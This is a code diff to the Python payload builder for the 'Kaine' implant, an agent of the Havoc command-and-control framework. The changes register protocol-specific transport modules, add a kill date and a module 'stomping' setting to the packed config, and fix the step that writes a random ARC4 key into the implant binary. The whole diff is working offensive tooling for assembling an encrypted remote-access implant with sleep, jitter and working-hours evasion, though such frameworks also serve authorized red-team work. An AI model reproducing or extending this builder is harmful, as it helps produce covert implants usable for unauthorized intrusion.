@@ -20,8 +20,9 @@ from struct import pack, unpack, calcsize
 from Crypto.Cipher import ARC4
 from Crypto.Random import get_random_bytes
 
-KAINE_COMMANDS: list = []
-KAINE_MODULES : list = []
+KAINE_COMMANDS  : list = []
+KAINE_MODULES   : list = []
+KAINE_PROTOCOLS : list = []
 
 @pyhavoc.agent.HcAgentExport
 class KnPacker:
@@ -252,11 +253,45 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         ##
         self.registered_modules = []
 
-        for ModuleClass in KAINE_MODULES:
-            module = ModuleClass()
-            module.interface( self.layout_options )
+        ##
+        ## TODO: when the operator changes the protocol erase the options
+        ##       widget and re-execute every module and protocol
+        ##
 
-            self.registered_modules.append( module )
+        ##
+        ## add protocol module
+        ##
+        listener_type = pyhavoc.core.HcListenerQueryType( self.combo_listener.currentText() )
+        for m in KAINE_PROTOCOLS:
+            if m[ "protocol" ] == listener_type:
+                module = m[ 'interface' ]()
+                module.interface( self.layout_options )
+                self.registered_modules.append( module )
+                break
+
+        ##
+        ## add feature and extensions
+        ##
+        for ModuleClass in KAINE_MODULES:
+            found  = False
+
+            ##
+            ## check if it is a protocol module,
+            ## and It's if is then ignore it
+            ##
+            for m in KAINE_PROTOCOLS:
+                if m[ "interface" ] == ModuleClass:
+                    found = True
+                    break
+
+            ##
+            ## if no the current module is not related to
+            ## protocol and transportation then ignore it
+            ##
+            if not found:
+                module = ModuleClass()
+                module.interface( self.layout_options )
+                self.registered_modules.append( module )
 
         return
 
@@ -316,6 +351,7 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
     def generate( self ) -> dict:
 
         working_hour: int = 0
+        kill_date   : int = 0
 
         ##
         ## if specified pack the working hours into a single integer
@@ -333,6 +369,9 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
             working_hour |= ( end_hour      & 0b011111 ) << 6
             working_hour |= ( end_minutes   & 0b111111 ) << 0
 
+        if self.check_killdate.isChecked():
+            kill_date = self.datetime_killdate.dateTime().toSecsSinceEpoch()
+
         ##
         ## return the configuration as a json package
         ##
@@ -344,8 +383,9 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
             "core": {
                 "sleep"     : int( self.input_sleep.text() ),
                 "jitter"    : int( self.input_jitter.text() ),
-                "kill date" : self.check_killdate.isChecked() if self.datetime_killdate.dateTime().toSecsSinceEpoch() else 0,
+                "kill date" : kill_date,
                 "work hour" : working_hour,
+                "stomping"  : self.input_stomping.text()
             }
         }
 
@@ -384,7 +424,6 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         :return:
             processed payload ready to use
         """
-        processed    : bytes    = payload
         config       : KnConfig = KnConfig()
         modules      : KnPacker = KnPacker()
         arc4_key     : bytes    = get_random_bytes( 16 )
@@ -392,9 +431,10 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         magic_val    : bytes    = b'5pdr'
         flags        : int      = 0
         exec_flag    : int      = 0
-        exec_module  : int      = ""
 
         config.arc4_key( arc4_key )
+
+        print( context )
 
         ##
         ## [core] config:
@@ -408,7 +448,7 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         ##  [ exec module  ] wstring
         ##  [ libraries    ] array<u8>
         ##    [ advapi32 flag ] u8
-        ##  [ extensions   ] array<[length, bytes]>
+        ##  [ ext config   ] array<[length, bytes]>
         ##
 
         config.add_raw( magic_val )
@@ -418,7 +458,7 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         config.add_u32( context[ 'implant' ][ 'core' ][ 'sleep'     ] )
         config.add_u32( context[ 'implant' ][ 'core' ][ 'jitter'    ] )
         config.add_u8( exec_flag )
-        config.add_wide_string( exec_module )
+        config.add_wide_string( context[ 'implant' ][ 'core' ][ "stomping" ] )
 
         ##
         ## modules flags
@@ -436,7 +476,7 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
             ##
             ## add the module configuration to the agent config
             ##
-            config.add_bytes( module.configuration( context ) )
+            config.add_raw( module.configuration( context ) )
 
             ##
             ## add the config code to the extensions list
@@ -444,14 +484,20 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
             modules.add_bytes( module.module() )
 
         ##
+        ## replace the key inside the kaine
+        ## payload with the generated one
+        ##
+        payload = payload.replace( arc4_pat, arc4_key )
+
+        ##
         ## Kaine implant format:
         ##
         ##   [ kaine agent ]
         ##   [ modules     ]
         ##      [ size   ]
-        ##      [ ------ ]
-        ##      [ size   ]
-        ##      [ module ]
+        ##      [ ------ ]      Usually the first few modules are more prioritized when it comes to
+        ##      [ size   ]      communication, core behaviour changes such as diff way of resolving
+        ##      [ module ]      functions and mapping of libraries.
         ##      [ ------ ]
         ##      [ size   ]
         ##      [ module ]
@@ -459,16 +505,10 @@ class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):
         ##   [ config      ]
         ##       ...
         ##
-        processed += modules.build()
-        processed += config.build()
+        payload += modules.build()
+        payload += config.build()
 
-        ##
-        ## replace the key inside the kaine
-        ## payload with the generated one
-        ##
-        processed.replace( arc4_pat, arc4_key )
-
-        return processed
+        return payload
 
 class HcKaineCommand:
     pass
@@ -1429,6 +1469,19 @@ class HcKaine( pyhavoc.agent.HcAgent ):
                 raise Exception( ctx[ 'status' ] )
 
         return ctx[ 'task-uuid' ]
+
+
+@pyhavoc.agent.HcAgentExport
+def KnKaineBuildProtocol( type: str ):
+
+    def _register( interface ):
+        KAINE_PROTOCOLS.append( {
+            "protocol" : type,
+            "interface": interface
+        } )
+
+    return _register
+
 
 @pyhavoc.agent.HcAgentExport
 class HcKaineBuildModule:
